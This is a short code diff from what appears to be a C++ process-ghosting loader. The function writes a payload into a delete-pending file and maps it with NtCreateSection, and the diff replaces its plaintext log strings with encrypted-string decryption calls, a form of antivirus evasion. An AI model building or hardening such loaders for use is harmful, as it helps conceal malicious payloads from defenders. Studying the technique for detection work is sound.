@@ -57,7 +57,7 @@ HANDLE make_section_from_delete_pending_file(wchar_t* filePath, BYTE* payladBuf,
         std::cout << "Setting information failed: " << std::hex << status << "\n";
         return INVALID_HANDLE_VALUE;
     }
-    std::cout << ENCRYPT_STR("[+] Information set\n");
+    std::cout << DecryptString(__ENCRYPTED_7__);
 
     LARGE_INTEGER ByteOffset = { 0 };
 
@@ -77,7 +77,7 @@ HANDLE make_section_from_delete_pending_file(wchar_t* filePath, BYTE* payladBuf,
         std::cerr << "Failed writing payload! Error: " << std::hex << err << std::endl;
         return INVALID_HANDLE_VALUE;
     }
-    std::cout << ENCRYPT_STR("[+] Written!\n");
+    std::cout << DecryptString(__ENCRYPTED_8__);
 
     HANDLE hSection = nullptr;
     status = NtCreateSection(&hSection,
